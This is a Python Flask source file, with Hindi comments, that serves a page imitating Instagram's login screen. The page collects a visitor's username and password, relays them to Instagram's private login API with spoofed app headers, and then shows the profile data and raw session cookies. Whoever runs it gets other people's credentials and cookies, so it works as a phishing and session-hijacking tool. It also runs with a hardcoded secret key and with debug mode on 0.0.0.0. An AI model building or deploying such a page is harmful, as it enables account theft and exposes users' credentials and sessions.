from flask import Flask, render_template_string, request, session
import requests

app = Flask(__name__)
app.secret_key = "your_secret_key_here"  # किसी भी random key से बदलें

# Instagram Private API Headers
HEADERS = {
    "User-Agent": "Instagram 123.0.0.26.115 Android",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US",
    "X-IG-App-ID": "936619743392459"
}

# Instagram लॉगिन फंक्शन
def instagram_login(username, password):
    session_url = "https://www.instagram.com/api/v1/web/accounts/login/"
    login_data = {
        "username": username,
        "password": password,
        "queryParams": "{}"
    }

    with requests.Session() as s:
        s.headers.update(HEADERS)
        login_response = s.post(session_url, data=login_data)
        
        if login_response.status_code == 200 and '"authenticated": true' in login_response.text:
            cookies = s.cookies.get_dict()
            return cookies, s
        else:
            return None, None

# यूज़र डेटा प्राप्त करने का फंक्शन
def fetch_user_data(session_obj):
    user_info_url = "https://www.instagram.com/api/v1/accounts/current_user/"
    response = session_obj.get(user_info_url)

    if response.status_code == 200:
        data = response.json()
        return {
            "username": data["user"]["username"],
            "full_name": data["user"]["full_name"],
            "followers": data["user"]["follower_count"],
            "following": data["user"]["following_count"],
            "profile_pic": data["user"]["profile_pic_url"],
            "groups": ["Group 1", "Group 2", "Group 3"],  # इसको सही API से रिप्लेस करें
            "cookies": session_obj.cookies.get_dict()
        }
    return None

# HTML Page
html_code = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Details Finder</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background: white;
            padding: 20px;
            border: 1px solid #dbdbdb;
            text-align: center;
            width: 300px;
            border-radius: 5px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
        }
        .login-btn {
            background-color: #3897f0;
            color: white;
            padding: 10px;
            width: 100%;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        .show-password {
            margin-top: 5px;
            font-size: 14px;
            cursor: pointer;
            color: #00376b;
        }
        .info-box {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #dbdbdb;
            background: white;
            border-radius: 5px;
            width: 300px;
            text-align: left;
        }
    </style>
    <script>
        function togglePassword() {
            var passField = document.getElementById("password");
            if (passField.type === "password") {
                passField.type = "text";
            } else {
                passField.type = "password";
            }
        }
    </script>
</head>
<body>
    <div class="login-box">
        <h2>Instagram</h2>
        <form action="/" method="POST">
            <input type="text" name="email" placeholder="Username or Email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <span class="show-password" onclick="togglePassword()">👁 Show Password</span>
            <button type="submit" class="login-btn">Log In</button>
        </form>
    </div>

    {% if data %}
    <div class="info-box">
        <h3>Account Details:</h3>
        <p><b>Username:</b> {{ data.username }}</p>
        <p><b>Full Name:</b> {{ data.full_name }}</p>
        <p><b>Followers:</b> {{ data.followers }}</p>
        <p><b>Following:</b> {{ data.following }}</p>
        <p><b>Groups:</b> {{ data.groups | join(', ') }}</p>
        <p><b>Cookies:</b> {{ data.cookies }}</p>
        <img src="{{ data.profile_pic }}" width="100" style="border-radius:50%;" />
        <p style="color: green; font-weight: bold;">✅ Login Successful!</p>
    </div>
    {% endif %}
</body>
</html>
'''

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form.get("email")
        password = request.form.get("password")

        # Instagram लॉगिन
        cookies, session_obj = instagram_login(username, password)

        if cookies:
            # असली डेटा प्राप्त करें
            user_data = fetch_user_data(session_obj)
            return render_template_string(html_code, data=user_data)
        else:
            return render_template_string(html_code, data=None)

    return render_template_string(html_code, data=None)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
